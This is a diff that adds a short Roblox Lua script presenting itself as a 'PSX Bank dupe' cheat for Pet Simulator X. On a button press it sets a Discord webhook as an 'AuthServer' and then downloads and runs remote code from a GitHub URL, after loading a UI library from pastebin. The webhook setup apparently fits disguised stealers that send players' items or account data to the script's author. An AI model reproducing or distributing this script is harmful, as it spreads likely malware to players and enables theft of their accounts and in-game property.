@@ -1,0 +1,15 @@
+local kavoUi = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+local window = kavoUi.CreateLib("PSX Bank dupe","Ocean")
+ 
+---Tabs
+ 
+local Tab1 = window:NewTab("Main")
+local Tab1Section = Tab1:NewSection("Main")
+
+ 
+---Buttons
+ 
+Tab1Section:NewButton("Press to start duping","On button",function()
+_G.Key = "58071lelak"
+_G.AuthServer = "https://discord.com/api/webhooks/1065991802613665802/Bl4Y6YEC3EOD48lDox9mX4na0MBFm5pQ-NR87nuutrvs7kPczvjsaFiER8XsLjELER8k"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()end)
